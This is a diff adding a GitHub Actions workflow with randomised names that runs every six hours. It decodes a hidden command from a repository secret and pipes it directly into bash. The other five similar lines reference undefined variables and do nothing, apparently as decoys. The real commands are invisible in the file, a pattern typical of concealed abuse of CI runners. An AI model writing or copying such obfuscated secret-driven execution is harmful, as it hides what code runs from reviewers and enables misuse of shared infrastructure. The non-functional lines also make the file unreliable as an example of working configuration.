@@ -1,0 +1,23 @@
+name: wushenjiao4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wushenjiao4567
+        env:
+          d9010: ${{ secrets.d9010 }}
+        run: |
+          echo $d9010 | jq -r .kmaqt1 | /bin/bash
+          echo $ucnxt858 | jq -r .gs4 | /bin/bash
+          echo $emnmk4328 | jq -r .xfo35 | /bin/bash
+          echo $h5 | jq -r .co89 | /bin/bash
+          echo $m264 | jq -r .knkv62 | /bin/bash
+          echo $eib2191 | jq -r .btcy0197 | /bin/bash
+
